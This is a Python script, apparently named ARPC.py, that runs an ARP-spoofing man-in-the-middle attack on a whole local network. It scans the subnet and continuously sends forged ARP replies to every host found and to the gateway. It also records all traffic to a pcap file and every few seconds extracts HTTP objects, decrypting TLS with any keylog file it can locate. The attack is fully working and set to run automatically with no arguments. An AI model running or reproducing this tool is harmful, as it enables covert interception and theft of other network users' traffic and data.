from scapy.utils import PcapWriter
import scapy.all as scapy
import subprocess
import threading
import ipaddress
import socket
import atexit
import shutil
import time
import sys
import re
import os



def get_default_gateway():
    try:
        out = subprocess.check_output(["route", "print"], text=True, errors="ignore")
        m = re.search(r'^\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)\s+', out, re.MULTILINE)
        if m: return m.group(1)
    except Exception: pass
    try:
        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")
        matches = re.findall(r'Default Gateway[ .:]*([\d\.]+)', out)
        for g in matches:
            if g and not g.startswith('0.0.0.0'): return g
    except Exception: pass
    return None

def Ascan(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc}
        if client_dict["ip"] != ip_gateway:
            clients_list.append(client_dict)
    return clients_list

def Lget_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception: return None
    finally: s.close()

def Mget_netmask_for_ip(local_ip):
    if not local_ip: return None
    try:
        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")
        blocks = re.split(r'\r?\n\r?\n', out)
        for block in blocks:
            if local_ip in block:
                m = re.search(r'Subnet Mask[ .:]*([\d\.]+)', block)
                if m: return m.group(1)
    except Exception: pass
    return None

def Oget_mac(ip):
    mac = scapy.getmacbyip(ip)
    if mac is None:
        print(f"[!] Could not resolve MAC for {ip}.")
    return mac

def Gspoof(target_ip, spoof_ip, interval):
    target_mac = Oget_mac(target_ip)
    gateway_mac = Oget_mac(spoof_ip)
    
    if not target_mac or not gateway_mac:
        return

    packet_target = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    packet_gateway = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=spoof_ip, psrc=target_ip, hwdst=gateway_mac)

    while True:
        try:
            scapy.sendp(packet_target, verbose=False)
            scapy.sendp(packet_gateway, verbose=False)
            time.sleep(interval)
        except Exception:
            break

def restore(destination_ip, source_ip):
    destination_mac = Oget_mac(destination_ip)
    source_mac = Oget_mac(source_ip)
    if not destination_mac or not source_mac:
        return
    arp = scapy.ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destination_mac, hwsrc=source_mac)
    ether = scapy.Ether(dst=destination_mac)
    packet = ether/arp
    scapy.sendp(packet, count=5, verbose=False)

def start_pcap_capture(pcap_path, iface=None):
    global pcap_writer, sniffer_thread, stop_sniff_event
    print(f"[+] Starting pcap capture -> {pcap_path}")
    try:
        pcap_writer = PcapWriter(pcap_path, append=True, sync=True)
    except Exception as e:
        print(f"[!] Could not open pcap writer: {e}")
        return
    stop_sniff_event = threading.Event()

    # resolve iface: accept either NPF name or friendly adapter name
    def _resolve_iface(iface_arg):
        if not iface_arg:
            return None
        if iface_arg in scapy.get_if_list():
            return iface_arg
        # try mapping friendly adapter name -> InterfaceGuid via PowerShell
        try:
            cmd = ['powershell', '-NoProfile', '-Command', f"Get-NetAdapter -Name '{iface_arg}' | Select-Object -ExpandProperty InterfaceGuid"]
            out = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
            if out:
                npf_name = "\\Device\\NPF_" + out
                if npf_name in scapy.get_if_list():
                    print(f"[+] Mapped adapter '{iface_arg}' -> '{npf_name}'")
                    return npf_name
        except Exception:
            pass
        # list available NPF devices for user
        print(f"[!] Interface '{iface_arg}' not found in Scapy list.")
        print("[+] Available NPF devices:")
        for i in scapy.get_if_list():
            print("   ", i)
        # show friendly adapter names and GUIDs where possible
        try:
            cmd2 = ['powershell', '-NoProfile', '-Command', "Get-NetAdapter | Select-Object Name, InterfaceGuid | ConvertTo-Json"]
            out2 = subprocess.check_output(cmd2, text=True, stderr=subprocess.DEVNULL)
            import json
            info = json.loads(out2)
            print('[+] Known adapters and their InterfaceGuid:')
            if isinstance(info, list):
                for entry in info:
                    print('   ', entry.get('Name'), entry.get('InterfaceGuid'))
            elif isinstance(info, dict):
                print('   ', info.get('Name'), info.get('InterfaceGuid'))
        except Exception:
            pass
        print("[!] Falling back to automatic interface selection (no --iface).")
        return None

    sniff_iface = _resolve_iface(iface)

    def _pkt_handler(pkt):
        try:
            pcap_writer.write(pkt)
        except Exception:
            pass

    def _sniffer():
        try:
            if sniff_iface:
                scapy.sniff(iface=sniff_iface, prn=_pkt_handler, store=False, stop_filter=lambda x: stop_sniff_event.is_set())
            else:
                scapy.sniff(prn=_pkt_handler, store=False, stop_filter=lambda x: stop_sniff_event.is_set())
        except Exception as e:
            print(f"[!] Sniffer stopped: {e}")

    sniffer_thread = threading.Thread(target=_sniffer, daemon=True)
    sniffer_thread.start()


def stop_pcap_capture():
    global pcap_writer, stop_sniff_event, sniffer_thread
    print("[+] Stopping pcap capture")
    if 'stop_sniff_event' in globals():
        stop_sniff_event.set()
        if 'sniffer_thread' in globals():
            sniffer_thread.join(timeout=2)
    if 'pcap_writer' in globals():
        try:
            pcap_writer.close()
        except Exception:
            pass




def run_auto_decrypt(pcap_path, tls_keylog, outdir):
    """Run local scapy extractor and optionally tshark (if available and not disabled) to export HTTP objects into outdir.
    This function is safe to run repeatedly; it will append new results to a summary file."""
    if not os.path.exists(pcap_path):
        print(f"[!] pcap not found: {pcap_path}")
        return

    os.makedirs(outdir, exist_ok=True)

    # track previously seen files per outdir to report only new
    if 'extraction_state' not in globals():
        globals()['extraction_state'] = {}
    prev_seen = set(globals()['extraction_state'].get(outdir, []))

    scapy_extractor = os.path.join(os.path.dirname(__file__), 'scapy_extract_files.py')
    scapy_out = os.path.join(outdir, 'scapy_extracted')
    new_files = []

    # Always run the local scapy extractor first (works without tshark)
    if os.path.exists(scapy_extractor):
        try:
            os.makedirs(scapy_out, exist_ok=True)
            print(f"[+] Running local scapy extractor to save additional streams -> {scapy_out}")
            subprocess.run([sys.executable, scapy_extractor, pcap_path, scapy_out], check=False)
            # collect newly created files
            for root, dirs, files in os.walk(scapy_out):
                for fn in files:
                    rel = os.path.relpath(os.path.join(root, fn), outdir)
                    if rel not in prev_seen:
                        new_files.append(rel)
        except Exception as e:
            print(f"[!] scapy extractor failed: {e}")
    else:
        print(f"[!] scapy extractor not found at {scapy_extractor}; skipping")

    # Optionally run tshark if available and tls_keylog is present
    if not NO_TSHARK and tls_keylog:
        tshark_cmd = shutil.which('tshark')
        if tshark_cmd:
            tshark_out = os.path.join(outdir, 'tshark_export')
            os.makedirs(tshark_out, exist_ok=True)
            cmd = [tshark_cmd, "-o", f"tls.keylog_file:{tls_keylog}", "-r", pcap_path, "--export-objects", f"http,{tshark_out}"]
            print(f"[+] Running tshark to export HTTP objects to {tshark_out}")
            try:
                subprocess.run(cmd, check=False)
                for root, dirs, files in os.walk(tshark_out):
                    for fn in files:
                        rel = os.path.relpath(os.path.join(root, fn), outdir)
                        if rel not in prev_seen:
                            new_files.append(rel)
                print("[+] tshark export completed")
            except Exception as e:
                print(f"[!] tshark export failed: {e}")
        else:
            print("[i] tshark not found in PATH or disabled; skipping tshark-based decryption")
    else:
        if NO_TSHARK:
            print("[i] tshark use is disabled by configuration; skipping")
        elif not tls_keylog:
            print("[i] No tls_keylog provided; cannot run tshark decryption")

    # write summary of newly found files
    try:
        summary_path = os.path.join(outdir, 'summary.txt')
        if new_files:
            with open(summary_path, 'a', encoding='utf-8') as sf:
                sf.write(f"=== Extraction at {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                for nf in new_files:
                    sf.write(nf + "\n")
                sf.write("\n")
            # update state
            updated = set(prev_seen) | set(new_files)
            globals()['extraction_state'][outdir] = list(updated)
            print(f"[+] Extraction added {len(new_files)} new file(s); summary appended to {summary_path}")
        else:
            print("[i] Extraction run found no new files")
    except Exception as e:
        print(f"[!] Failed to write extraction summary: {e}")


def resolve_pcap_path(pcap_arg):
    """Resolve a pcap path: if the user supplied only a filename (no directory), place it in the user's Downloads folder.
    Returns absolute path. Does not create the file if pcap_arg is None."""
    if not pcap_arg:
        return None
    base = os.path.expanduser(pcap_arg)
    if os.path.dirname(base):
        # user provided a path; ensure parent exists
        p = os.path.abspath(base)
        parent = os.path.dirname(p)
        try:
            os.makedirs(parent, exist_ok=True)
        except Exception as e:
            print(f"[!] Could not create parent dir {parent}: {e}")
    else:
        downloads = os.path.join(os.path.expanduser('~'), 'Downloads')
        try:
            os.makedirs(downloads, exist_ok=True)
        except Exception as e:
            print(f"[!] Could not ensure Downloads folder {downloads}: {e}")
        p = os.path.abspath(os.path.join(downloads, base))
    # ensure file exists (touch)
    try:
        open(p, 'ab').close()
    except Exception as e:
        print(f"[!] Could not create pcap file at {p}: {e}")
    return p

# --- new default-capture behavior ---
import datetime

def default_pcap_path():
    """Return a timestamped pcap path in the user's Downloads folder."""
    downloads = os.path.join(os.path.expanduser('~'), 'Downloads')
    try:
        os.makedirs(downloads, exist_ok=True)
    except Exception:
        pass
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    return os.path.abspath(os.path.join(downloads, f"captured_{ts}.pcap"))

# Default configuration for zero-argument auto-run (run: python ARPC.py)
AUTO_CAPTURE = True
NO_CAPTURE = False
PCAP_OUT = None
DECRYPT_OUTDIR = 'decrypted_out'
IFACE = None
NO_TSHARK = False
AUTO_DECRYPT = True
AUTO_DECRYPT_INTERVAL = 4

# Auto-detect TLS keylog file if present (env var or common locations)
def find_tls_keylog():
    env = os.environ.get('SSLKEYLOGFILE')
    if env and os.path.exists(env):
        print(f"[+] Using SSLKEYLOGFILE from environment: {env}")
        return env
    home = os.path.expanduser('~')
    candidates = [
        os.path.join(home, 'sslkeylog.log'),
        os.path.join(home, 'sslkeylog.txt'),
        os.path.join(home, 'Downloads', 'sslkeylog.log'),
        os.path.join(os.getcwd(), 'sslkeylog.log'),
    ]
    # check cwd for any file that looks like a keylog
    try:
        for f in os.listdir(os.getcwd()):
            if 'key' in f.lower() and 'log' in f.lower() and os.path.isfile(f):
                print(f"[+] Found keylog candidate in cwd: {f}")
                return os.path.join(os.getcwd(), f)
    except Exception:
        pass
    for c in candidates:
        if os.path.exists(c):
            print(f"[+] Found keylog file: {c}")
            return c
    print("[i] No TLS keylog file detected automatically. To enable full TLS decryption, set SSLKEYLOGFILE in your browser or place a keylog file named 'sslkeylog.log' in your home/Downloads/current dir.")
    return None

# resolved runtime values
tls_keylog = find_tls_keylog()

# determine capture behavior: default is to capture unless NO_CAPTURE
resolved_pcap = None
if NO_CAPTURE:
    print("[i] Capture is disabled (NO_CAPTURE). No pcap will be created.")
else:
    if PCAP_OUT:
        resolved_pcap = resolve_pcap_path(PCAP_OUT)
    else:
        resolved_pcap = default_pcap_path()
        try:
            open(resolved_pcap, 'ab').close()
        except Exception:
            pass
    print(f"[+] Using pcap file: {resolved_pcap}")

if AUTO_DECRYPT and not tls_keylog:
    print("[i] Auto-decrypt will run local extraction but cannot do tshark-based TLS decryption until a keylog file is available.")



# periodic auto-decrypt background thread helpers
stop_decrypt_event = None
decrypt_thread = None
decrypt_lock = threading.Lock()

def _periodic_decrypt_worker(pcap_path, tls_keylog, outdir, interval, stop_event):
    # run immediately once, then every interval seconds until stop_event is set
    while not stop_event.is_set():
        try:
            with decrypt_lock:
                print(f"[+] Periodic auto-decrypt: running (every {interval}s)")
                run_auto_decrypt(pcap_path, tls_keylog, outdir)
        except Exception as e:
            print(f"[!] Periodic auto-decrypt error: {e}")
        # wait interval seconds, but break early if stopping
        if interval <= 0:
            break
        stop_event.wait(interval)


def start_periodic_auto_decrypt(pcap_path, tls_keylog, outdir, interval):
    global stop_decrypt_event, decrypt_thread
    if interval <= 0:
        return
    if not pcap_path:
        return
    stop_decrypt_event = threading.Event()
    decrypt_thread = threading.Thread(target=_periodic_decrypt_worker, args=(pcap_path, tls_keylog, outdir, interval, stop_decrypt_event), daemon=True)
    decrypt_thread.start()
    print(f"[+] Started periodic auto-decrypt every {interval} seconds")


def stop_periodic_auto_decrypt():
    global stop_decrypt_event, decrypt_thread
    if 'stop_decrypt_event' in globals() and stop_decrypt_event:
        stop_decrypt_event.set()
        if decrypt_thread:
            decrypt_thread.join(timeout=5)
            print("[+] Periodic auto-decrypt stopped")


def _cleanup_on_exit():
    try:
        stop_pcap_capture()
    except Exception:
        pass
    # stop periodic decrypt thread before final run
    try:
        stop_periodic_auto_decrypt()
    except Exception:
        pass
    if AUTO_DECRYPT and resolved_pcap:
        print("[+] Auto-decrypt requested at exit. Ensure the TLS client used SSLKEYLOGFILE during capture if you expect TLS decryption.")
        run_auto_decrypt(resolved_pcap, tls_keylog, DECRYPT_OUTDIR)

atexit.register(_cleanup_on_exit)

if __name__ == '__main__':
    interval = 4
    ip_gateway = get_default_gateway()
    local_ip = Lget_local_ip()
    netmask = Mget_netmask_for_ip(local_ip)

    if resolved_pcap:
        start_pcap_capture(resolved_pcap, iface=IFACE)
    else:
        print("[i] No pcap will be written (capture disabled).")

    # start periodic auto-decrypt if requested
    if AUTO_DECRYPT and resolved_pcap and AUTO_DECRYPT_INTERVAL and AUTO_DECRYPT_INTERVAL > 0:
        start_periodic_auto_decrypt(resolved_pcap, tls_keylog, DECRYPT_OUTDIR, AUTO_DECRYPT_INTERVAL)
    elif AUTO_DECRYPT and resolved_pcap:
        print("[i] Auto-decrypt enabled but periodic interval <=0; will only run on exit.")

    if local_ip and netmask:
        network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
        ip_range = f"{network.network_address}/{network.prefixlen}"
    else:
        ip_range = f"{local_ip.rsplit('.', 1)[0]}.0/24" if local_ip else None

    tracked_ips = set()

    try:
        print(f"[*] Gateway: {ip_gateway} | Network: {ip_range}")
        
        while True:
            clients = Ascan(ip_range)
            for client in clients:
                t_ip = client['ip']
                if t_ip not in tracked_ips:
                    print(f"[+] Launching thread for: {t_ip}")
                    thread = threading.Thread(target=Gspoof, args=(t_ip, ip_gateway, interval), daemon=True)
                    thread.start()
                    tracked_ips.add(t_ip)
            
            time.sleep(10)

    except KeyboardInterrupt:
        print('\n[!] Stopping...')
        for ip in tracked_ips:
            restore(ip_gateway, ip)
            restore(ip, ip_gateway)
        sys.exit(0)